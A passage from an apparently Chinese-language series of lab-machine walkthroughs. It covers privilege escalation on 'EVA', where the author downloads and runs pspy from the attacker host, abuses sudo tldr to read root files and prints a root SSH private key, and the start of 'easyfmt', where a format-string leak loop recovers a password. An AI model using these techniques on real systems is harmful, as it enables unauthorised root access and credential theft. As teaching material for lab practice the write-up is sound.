pong
ping
ping
ping
ping
pong
ping
ping
pong
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
pong
pong
ping
pong
ping
pong
pong
ping
pong
pong
pong
ping
ping
pong
pong
ping
pong
pong
ping
pong
ping
ping
ping
ping
pong
pong
ping
ping
pong
ping
pong
ping
pong
pong
ping
ping
pong
ping
pong
ping
pong
pong
pong
ping
ping
ping
ping
ping
pong
pong
pong
ping
pong
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
pong
pong
ping
ping
```

纯猜谜，ping为0，pong为1

```
uesugierii@EVA:~$ sed 's/ping/0/g; s/pong/1/g' eva.pinglog |tr -d '\n'
010001100110100101101110011001110110000101101100001110100100001001101100011000010110001101101011011100110110100001100101011001010111000001110111011000010110110001101100
```

![image-20250608111738243](https://7r1umphk.github.io/image/20250608111738641.webp)

Fingal:Blacksheepwall

登录

```
EVA:~$ su Fingal
Password: 
$ bash
Fingal@EVA:/home/uesugierii$ id
uid=1000(Fingal) gid=1000(Fingal) groups=1000(Fingal)
```

继续找信息

```
Fingal@EVA:/home/uesugierii$ cd ~
Fingal@EVA:~$ ls -la
total 32
drwx------ 2 Fingal Fingal 4096 Jun  6 10:48 .
drwxr-xr-x 5 root   root   4096 Jun  6 09:43 ..
lrwxrwxrwx 1 root   root      9 Jun  6 09:12 .bash_history -&gt; /dev/null
-rw-r--r-- 1 Fingal Fingal  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 Fingal Fingal 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 Fingal Fingal  156 Jun  6 09:13 kernel.txt
-rw-r--r-- 1 Fingal Fingal  807 Apr 18  2019 .profile
-rw------- 1 Fingal Fingal   23 Jun  6 10:48 Ricardo.M.Lu
-rw-r--r-- 1 root   root     48 Jun  6 09:12 user.txt
Fingal@EVA:~$ cat kernel.txt 
1. Lu Mingfei's safety is the top priority
2. Immediate rescue operation when Lu Mingfei's life is endangered
3. All rules are unmodifiable and irrevocable
Fingal@EVA:~$ cat Ricardo.M.Lu 
lumingfei:DivineDecree
Fingal@EVA:~$ cat user.txt 
flag{user-da00c95d-42d7-11f0-a8f0-000c2955ba04}
```

kernel.txt 文件是关键，这里需要一点龙族的知识

诺玛是一个超级计算机，他的核心代码写入了保护路明非，kernel.txt是他的规则

1. 路明非的安全至上
2. 路明非生命受到威胁时，立即展开救援行动
3. 所有规则均不可更改且不可撤销

扒拉一个pspy过来，看看是不是有迹可循

```
Fingal@EVA:~$ busybox wget 192.168.205.206/pspy64
Connecting to 192.168.205.206 (192.168.205.206:80)
pspy64               100% |***********************************************************************************************************************************| 3032k  0:00:00 ETA
Fingal@EVA:~$ chmod +x pspy64 
Fingal@EVA:~$ ./pspy64 
2025/06/07 23:21:52 CMD: UID=0     PID=3558   | /bin/bash /usr/local/bin/dragon_rule 
2025/06/07 23:21:52 CMD: UID=0     PID=3559   | sudo usermod -s /usr/sbin/nologin lumingfei 
```

关键的两句，他先执行了/usr/local/bin/dragon_rule ，然后以管理员权限修改用户，将登录 Shell 为 `/usr/sbin/nologin`，即禁止该用户登录系统。

瞄眼看能不能看dragon_rule 

```
Fingal@EVA:~$ ls -la /usr/local/bin/dragon_rule
-rwx------ 1 root root 784 Jun  6 09:15 /usr/local/bin/dragon_rule
```

不能拿等拿了root再看吧

```
Fingal@EVA:~$ su lumingfei
Password: 
This account is currently not available.
```

确实登录不了，其实处理方法很简单，我猜测dragon_rule是一个监听文本的脚本，监听的就是kernel.txt，所以，如果这个文件没有了，他就挂掉了

```
Fingal@EVA:~$ mv kernel.txt kernel.txt.bak
Fingal@EVA:~$ su lumingfei
Password: 
lumingfei@EVA:/home/Fingal$ id
uid=1001(lumingfei) gid=1001(lumingfei) groups=1001(lumingfei)
```

继续找信息

```
lumingfei@EVA:/home/Fingal$ cd 
lumingfei@EVA:~$ ls -al
total 20
drwx------ 2 lumingfei lumingfei 4096 Jun  6 09:12 .
drwxr-xr-x 5 root      root      4096 Jun  6 09:43 ..
-rw-r--r-- 1 lumingfei lumingfei  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 lumingfei lumingfei 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 lumingfei lumingfei  807 Apr 18  2019 .profile
lumingfei@EVA:~$ sudo -l
Matching Defaults entries for lumingfei on EVA:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lumingfei may run the following commands on EVA:
    (ALL) NOPASSWD: /usr/local/bin/tldr
```

能执行tldr，如果你经常看群主的视频，你就会非常熟悉tldr，他喜欢拿tldr看socat的语句，示范一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr 
Command 'tldr' not found, but can be installed with:
sudo apt install tealdeer
Do you want to install it? (N/y)y
sudo apt install tealdeer
[sudo] password for kali: 
The following packages were automatically installed and are no longer required:
  docker-buildx-plugin  docker-ce-rootless-extras  docker-compose-plugin  libslirp0  slirp4netns
Use 'sudo apt autoremove' to remove them.

Installing:
  tealdeer

Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 0
  Download size: 967 kB
  Space needed: 2,761 kB / 91.0 GB available

Get:1 https://mirrors.aliyun.com/kali kali-rolling/main amd64 tealdeer amd64 1.7.2-1+b1 [967 kB]
Fetched 967 kB in 1s (1,107 kB/s)
Selecting previously unselected package tealdeer.
(Reading database ... 474779 files and directories currently installed.)
Preparing to unpack .../tealdeer_1.7.2-1+b1_amd64.deb ...
Unpacking tealdeer (1.7.2-1+b1) ...
Setting up tealdeer (1.7.2-1+b1) ...
Processing triggers for kali-menu (2025.2.7) ...
Processing triggers for man-db (2.13.1-1) ...
                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr socat               
Error: Page cache not found. Please run `tldr --update` to download the cache.

Note: You can optionally enable automatic cache updates by adding the
following config to your config file:

  [updates]
  auto_update = true

The path to your config file can be looked up with `tldr --show-paths`.
To create an initial config file, use `tldr --seed-config`.

You can find more tips and tricks in our docs:

  https://tealdeer-rs.github.io/tealdeer/config_updates.html
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr --update
Successfully created cache directory path `/home/kali/.cache/tealdeer`.
Successfully updated cache.
                                                               
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tldr socat   

  Multipurpose relay (SOcket CAT).
  More information: &lt;http://www.dest-unreach.org/socat/&gt;.

  Listen to a port, wait for an incoming connection and transfer data to STDIO:

      sudo socat - TCP-LISTEN:8080,fork

  Listen on a port using SSL and print to STDOUT:

      sudo socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT

  Create a connection to a host and port, transfer data in STDIO to connected host:

      sudo socat - TCP4:www.example.com:80

  Forward incoming data of a local port to another host and port:

      sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80

  Send data with multicast routing scheme:

      echo 'Hello Multicast' | socat - UDP4-DATAGRAM:224.0.0.1:5000

  Receive data from a multicast:

      socat - UDP4-RECVFROM:5000


```

挺好用的，可以下载试试，回顾正题

看看帮助文档

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr --help
usage: tldr command [options]

Python command line client for tldr

positional arguments:
  command               command to lookup

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  --search 'KEYWORDS'   Search for a specific command from a query
  -u, --update, --update_cache
                        Update the local cache of pages and exit
  -k, --clear-cache     Delete the local cache of pages and exit
  -p PLATFORM, --platform PLATFORM
                        Override the operating system [android, freebsd, linux, netbsd, openbsd, osx, sunos, windows, common]
  -l, --list            List all available commands for operating system
  -s SOURCE, --source SOURCE
                        Override the default page source
  -c, --color           Override color stripping
  -r, --render          Render local markdown files
  -L LANGUAGE, --language LANGUAGE
                        Override the default language
  -m, --markdown        Just print the plain page file.
  --short-options       Display shortform options over longform
  --long-options        Display longform options over shortform
  --print-completion {bash,zsh,tcsh}
                        print shell completion script
```

![image-20250608113303243](https://7r1umphk.github.io/image/20250608113303691.webp)

提权的关键

-r, --render 渲染本地markdown 文件

-m, --markdown 仅打印纯文本页面文件。

那直接看root.txt就ok了

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/root.txt
flag{root-da00c95d-42d7-11f0-a8f0-000c2955ba04}
```

看有没有ssh私钥

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_rsa   
```

没有，找ssh配置文件看看，有啥私钥

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /etc/ssh/ssh_config

# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Include /etc/ssh/ssh_config.d/*.conf

Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_dsa
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ecdsa
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF
1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA
AAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ
RIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=
-----END OPENSSH PRIVATE KEY-----

```

扒拉过来本地

```
lumingfei@EVA:~$ vim id
lumingfei@EVA:~$ cat id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF
1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA
AAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ
RIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=
-----END OPENSSH PRIVATE KEY-----

lumingfei@EVA:~$ chmod 600 id 
lumingfei@EVA:~$ ssh root@127.0.0.1 -i id 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun  6 10:46:54 2025 from 192.168.3.94
root@EVA:~# id
uid=0(root) gid=0(root) groups=0(root)
```

扒拉一下脚本，看看怎么实现的

```
root@EVA:~# cat /usr/local/bin/dragon_rule
#!/bin/bash

RULES=(
    'Lu Mingfei's safety is the top priority'
    'Immediate rescue operation when Lu Mingfei's life is endangered'
    'All rules are unmodifiable and irrevocable'
)
verify_rules() {
    for rule in '${RULES[@]}'; do
        if ! grep -qF '$rule' /home/Fingal/kernel.txt; then
            return 1
        fi
    done
    return 0
}
protect_lumingfei() {
    if verify_rules; then
        sudo usermod -s /usr/sbin/nologin lumingfei 2&gt;/dev/null
    else
        sudo usermod -s /bin/bash lumingfei 2&gt;/dev/null
        sudo systemctl stop dragon-monitor 2&gt;/dev/null
        sudo systemctl disable dragon-monitor 2&gt;/dev/null
    fi
}
protect_lumingfei
inotifywait -m -e modify,delete /home/Fingal/kernel.txt 2&gt;/dev/null | while read; do
    protect_lumingfei
done
```

ai生成的逻辑流程图

```
┌──────────────────────────────┐
│ 监听 kernel.txt 修改/删除事件 │
└────────────┬─────────────────┘
             │
             ▼
     ┌────────────────────┐
     │   验证 kernel.txt 内容  │
     └────────────┬─────────┘
                  │
      ┌───────────┴────────────┐
      ▼                        ▼
[ 规则完整 ]           [ 规则不完整 ]
  ↓                            ↓
禁止 lumingfei 登录       允许 lumingfei 登录
保持 dragon-monitor 运行    停止并禁用 dragon-monitor
```

那有个想法，wsl2使用kali的不是天天要修改两个hosts吗？设置一个监听，如果linux hosts有修改就复制去windows hosts，完美解决，哈哈哈，你们自己去尝试吧sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Eva.html</guid><pubDate>Fri, 27 Jun 2025 09:29:35 +0000</pubDate></item><item><title>内部_easyfmt</title><link>https://7r1UMPHK.github.io/post/nei-bu-_easyfmt.html</link><description>![image-20250620183907687](https://7r1umphk.github.io/image/20250620183915120.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l           
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
192.168.205.139 08:00:27:7c:4c:12       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fd:86:ce       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.063 seconds (124.09 hosts/sec). 4 responded
                                   
```

139的ip，进行服务探测

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- 192.168.205.139                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 06:40 EDT
Nmap scan report for 192.168.205.139
Host is up (0.00016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:7C:4C:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
 
```

有个1337端口，nc上去瞄一眼

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc 192.168.205.139 1337 
welcome:Where is my password?
root:Well,it's in the stack,just find it.
```

翻译一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo 'welcome:Where is my password?                  
root:Well,it's in the stack,just find it.' | trans -b :zh 2&gt;/dev/null
欢迎：我的密码在哪里？
root：嗯，它在堆栈中，只是找到它。
           
```

提示 堆栈

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc 192.168.205.139 1337 
welcome:Where is my password?
root:Well,it's in the stack,just find it.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

丢了亿点A过去，回显没价值，**栈溢出**暂时无果

然后就试了一下**格式化字符串**

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc 192.168.205.139 1337
welcome:Where is my password?
root:Well,it's in the stack,just find it.
%p.%p.%p.%p.%p.%p
0x1afc2a1.(nil).0x1afc2b2.0x7ffd9c94ced0.0x7ff5d0eb2be0.0x70252e70252e7025

```

找到了，拿脚本爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ for i in $(seq 1 40); do echo -n '$i\n'
pa=$(python3 -c 'print('.'.join(['%p'] * $i))')
echo '$pa' | nc -w 1 192.168.205.139 1337 | tail -n 1
done
1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22
0xf472a1.(nil).(nil).0x7ffd4ea8b960.0x7f08e27a0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f08e25f5d7a.0x7ffd4ea8bab8.0x14ea8bc89.
23
0x21f62a1.(nil).(nil).0x7fff4c072100.0x7f0958737be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f095858cd7a.0x7fff4c072258.0x14c072429.
24
0x135f2a1.(nil).(nil).0x7ffce42da9e0.0x7f908d69abe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f908d4efd7a.0x7ffce42dab38.0x1e42dad09.
25
0x1b9f2a1.(nil).(nil).0x7ffdc9ef61f0.0x7f8a23246be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8a2309bd7a.0x7ffdc9ef6348.0x1c9ef6519.
26
0x10472a1.(nil).(nil).0x7fff6159ddc0.0x7f4e89dc1be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f4e89c16d7a.0x7fff6159df18.0x16159e0e9.
27
0x1de52a1.(nil).(nil).0x7fff75c854d0.0x7ff45c50bbe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff45c360d7a.0x7fff75c85628.0x175c857f9.
28
0xbe52a1.(nil).(nil).0x7ffe4fd2f9b0.0x7f5fc99e8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5fc983dd7a.0x7ffe4fd2fb08.0x14fd2fcd9.
29
0x1b822a1.(nil).(nil).0x7fffc7c06ac0.0x7f3e6f018be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f3e6ee6dd7a.0x7fffc7c06c18.0x1c7c06de9.
30
0x176f2a1.(nil).(nil).0x7ffd196b6bd0.0x7f79cf143be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f79cef98d7a.0x7ffd196b6d28.0x1196b6ef9.
31
0x1b242a1.(nil).(nil).0x7ffe081aeea0.0x7f978cae5be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f978c93ad7a.0x7ffe081aeff8.0x1081af1c9.
32
0x1f1c2a1.(nil).(nil).0x7ffe621be420.0x7f9d098d9be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f9d0972ed7a.0x7ffe621be578.0x1621be749.
33
0x191c2a1.(nil).(nil).0x7ffc5b7e0190.0x7f5c090fabe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5c08f4fd7a.0x7ffc5b7e02e8.0x15b7e04b9.
34
0x1e482a1.(nil).(nil).0x7ffd2f19fc30.0x7ff602059be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff601eaed7a.0x7ffd2f19fd88.0x12f19ff59.
35
0x19452a1.(nil).(nil).0x7ffd038568d0.0x7f2a117a8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f2a115fdd7a.0x7ffd03856a28.0x103856bf9.
36
0xd592a1.(nil).(nil).0x7ffde1f69190.0x7f8e3bbc2be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8e3ba17d7a.0x7ffde1f692e8.0x1e1f694b9.
37
0x126a2a1.(nil).(nil).0x7ffe821c3800.0x7f492e554be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f492e3a9d7a.0x7ffe821c3958.0x1821c3b29.
38
0x9dc2a1.(nil).(nil).0x7ffd0117d1e0.0x7fb8ec1b4be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fb8ec009d7a.0x7ffd0117d338.0x10117d509.
39
0x10c22a1.(nil).(nil).0x7ffdd856fdc0.0x7fd5d4155be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fd5d3faad7a.0x7ffdd856ff18.0x1d85700e9.
40
0x8e82a1.(nil).(nil).0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f34bfaf5d7a.0x7ffd3af090b8.0x13af09289.

```

随便拿一行处理一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo '0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f' | sed 's/0x//g; s/\./\n/g'|while read line; do echo '$line' | xxd -r -p 2&gt;/dev/null |rev 2&gt;/dev/null;done
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.welcome:Y0u_c4nt_f1nd_m3                                                                                     
```

welcome:Y0u_c4nt_f1nd_m3

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh welcome@192.168.205.139
The authenticity of host '192.168.205.139 (192.168.205.139)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (6 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.139' (ED25519) to the list of known hosts.
welcome@192.168.205.139's password: 
Linux easyfmt 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 18 09:56:53 2025 from 192.168.43.21
welcome@easyfmt:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

找

```
welcome@easyfmt:~$ ls -al
total 44
drwx------ 3 welcome welcome 4096 Jun 17 10:53 .
drwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..
lrwxrwxrwx 1 root    root       9 Jun 15 08:24 .bash_history -&gt; /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
drwxr-xr-x 4 welcome welcome 4096 Jun 17 00:58 .cache
-rw------- 1 root    root       2 Jun 15 08:59 .gdb_history
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 welcome welcome  682 Jun 17 07:39 server.c
-rw-r--r-- 1 root    root      44 Jun 17 10:40 user.txt
-rw------- 1 welcome welcome 8187 Jun 17 10:53 .viminfo
welcome@easyfmt:~$ cat user.txt 
flag{user-a0f6b8f4de02df56f52e55bcdded458c}
welcome@easyfmt:~$ sudo -l
sudo: unable to resolve host easyfmt: Name or service not known
[sudo] password for welcome: 
Sorry, user welcome may not run sudo on easyfmt.
welcome@easyfmt:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/opt/vuln
welcome@easyfmt:~$ cd /opt/
welcome@easyfmt:/opt$ ls -al
total 52
drwxr-xr-x  3 root    root     4096 Jun 18 09:51 .
drwxr-xr-x 18 root    root     4096 Mar 18 20:37 ..
drwxr-xr-x  6 root    root     4096 Dec 31  1969 pwndbg
